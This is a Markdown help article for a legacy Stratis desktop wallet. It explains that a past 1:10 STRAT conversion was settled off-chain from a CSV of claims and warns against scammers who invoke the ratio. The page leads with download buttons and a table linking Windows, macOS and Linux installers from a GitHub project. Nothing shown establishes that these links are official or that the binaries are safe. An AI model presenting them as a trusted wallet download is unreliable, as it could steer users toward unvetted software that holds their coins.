![Electrum-Stratis](assets/banner-article.png)

# 1:10, off-chain, and the CSV that confirmed it

<p align="center">A record, not a rate</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

The conversion between legacy STRAT and the current chain's asset ran at a fixed ratio of one to ten, and it was settled off-chain against a submitted list rather than by a contract on either network. A CSV of addresses and amounts was the record: it said who had sent what and how much the operator owed them on the other side. That record is history, not a rate you can use today. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| What you are looking at | What it is | What it is not |
|---|---|---|
| A ratio of 1:10 | A rule applied inside the window | A market price |
| A CSV of addresses and amounts | The conversion's accounting | A wallet file |
| A "rate" on a website today | History repeated as if current | A live quote |
| A calculator offering the ratio | Arithmetic on a closed process | A conversion |
| A screenshot of the list | Evidence of one submission | Proof of settlement |

</div>

The ratio explains historical numbers; it does not create a route. Anyone applying it today is doing arithmetic about the past.

## Why it happens

A migration that issues a new asset has to decide how much of it each holder receives. A fixed ratio is the simplest rule: count the old units, multiply, credit the new ones. It is fair in the narrow sense that everyone gets the same treatment, and it is arbitrary in the wider sense that the ratio is a policy choice, not a discovered price.

Settling off-chain follows from that. If the operator credits balances rather than running a contract, the work is bookkeeping: collect claims, check them, pay them. A CSV is exactly the artefact that process produces - a list, not a ledger, and not something the receiving chain can verify.

## Fix

1. **Treat the ratio as a historical constant, not a rate.** It tells you how a past conversion was calculated. It says nothing about what anything is worth now, and no one is obliged to apply it.
2. **Read the CSV as a record, not an instruction.** If you have one, it documents what was submitted and what was owed. It is evidence about a closed process.
3. **Do not send coins to anyone promising the ratio.** A private counterparty applying a historical ratio is offering a trade, with all the risk of a trade and none of the protections of a process.
4. **Reconstruct your own history from the chain.** Addresses and transactions tell you what you held and what moved; the CSV tells you what the operator acknowledged.
5. **Keep the file if you have it, with its date.** A record without a date is a rumour; with a date it is evidence.

The deeper point is that the ratio lived in an operator's books, not in either chain. A contract would have left a public trail of credits and could be inspected by anyone; a list leaves only the operator's word and a file. That is why the CSV matters as evidence and why it cannot function as a rate: it records a decision, it does not enforce one. Anyone can multiply by ten; only the operator could have honoured the result, and the operator stopped. The wallet deals in the legacy asset itself and makes no claim about a conversion that ended; the maintained build on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19) is the one to run. What the legacy chain still supports is [whether the legacy Stratis chain still runs](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/does-the-legacy-chain-still-run.md), and [why no Electrum Stratis flow needs a seed](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/why-no-flow-needs-a-seed.md).

If a claim about the ratio appears in a chat, ask for the transaction on the destination chain. That is the only part of the process that cannot be fabricated cheaply.

## If that did not work

If you submitted a claim and never received the credit, the CSV is the starting point: it shows what was recorded. From there the question is a support question about a closed process, not a wallet question.

If you have coins and no record, the chain is the record. Your addresses show what you held; nothing about the ratio changes what those keys control.

If a site offers to "check your ratio", it is asking for an address or a key. An address reveals history; a key hands over the coins. Neither is needed to read a public record.

## Prevention

- Never treat a historical ratio as a current exchange rate.
- Keep dated copies of any submission you made.
- Do not pay a fee to "release" a conversion.
- Verify claims against a transaction ID, not a screenshot.
- Record balances by chain, not by brand name.

## FAQ

### Was the conversion ratio 1:10?

Yes - the window applied a fixed one-to-ten ratio between legacy units and the new asset. It was a policy applied inside the window, not a market price, and it does not operate today.

### What was the CSV for?

It recorded the claims: addresses, amounts, and what the operator owed on the other side. It was the accounting artefact of an off-chain process, which is why it is evidence of a submission rather than proof of settlement.

### Can I use the ratio to convert coins now?

No. The process that honoured it has ended, and arithmetic does not create a counterparty. Applying the ratio today describes what would have happened, not what can.

### Does the wallet know about the conversion?

No. This wallet holds and moves the legacy asset; it has no conversion screen because it cannot settle a conversion. Any interface claiming otherwise is describing a service that is not running.

<!-- DOWNLOAD-BLOCK -->

If you are reconstructing what a balance should have become, write the arithmetic down before trusting any figure: coins held, multiplied by ten, credited on the other chain. The statement is the record of that calculation, and a screenshot of a balance is not. Anyone quoting a different multiplier is describing a different event.

## Related articles

- [The swap is closed](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/the-conversion-window-is-closed.md)
- [Why every price you see is quoted in STRAX](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/why-prices-are-quoted-in-strax.md)
- [The paper wallet that could not be swept](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/paper-wallet-that-cannot-be-swept.md)
- [STRAT is not STRAX](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/why-strat-and-strax-differ.md)
